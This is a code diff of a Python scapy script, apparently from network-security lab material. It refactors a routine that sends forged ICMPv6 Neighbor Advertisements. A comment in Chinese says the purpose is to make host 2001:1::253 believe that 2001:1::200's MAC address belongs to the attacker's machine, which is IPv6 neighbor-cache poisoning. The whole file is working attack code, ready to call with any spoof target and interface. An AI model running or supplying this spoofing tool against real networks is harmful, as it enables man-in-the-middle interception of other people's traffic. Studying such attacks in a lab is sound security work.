@@ -15,17 +15,20 @@ import logging
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
 from scapy.all import *
-from Part1_Classic_Protocols.Tools.GET_MAC import get_mac_address
+from Tools.GET_MAC_netifaces import get_mac_address
+from ICMPv6_NS import icmpv6_ns
 
-ll_mac = get_mac_address('ens33')
-ether = Ether(dst='00:50:56:ab:4d:19')
-base=IPv6(src='2001:1::200', dst='FE80::250:56FF:FEAB:4D19')
-neighbor_advertisements=ICMPv6ND_NA(tgt="2001:1::200",R=0,S=0,O=1)
-src_ll_addr=ICMPv6NDOptDstLLAddr(lladdr=ll_mac)
-packet=ether/base/neighbor_advertisements/src_ll_addr
-packet.show()
-sendp(packet)
+
+def icmpv6_na(spoofhost, dsthost, ifname):
+    ll_mac = get_mac_address(ifname)
+    ether = Ether(dst=icmpv6_ns(dsthost, ifname))
+    base = IPv6(src=spoofhost, dst=dsthost)
+    neighbor_advertisements = ICMPv6ND_NA(tgt=spoofhost, R=0, S=0, O=1)
+    src_ll_addr = ICMPv6NDOptDstLLAddr(lladdr=ll_mac)
+    packet = ether / base / neighbor_advertisements / src_ll_addr
+    sendp(packet,verbose=False)
 
 
 if __name__ == '__main__':
-    pass
+    # 欺骗2001:1::253 让它认为2001:1::200的MAC地址为本地攻击者计算机的MAC
+    icmpv6_na("2001:1::200", "2001:1::253", "ens33")
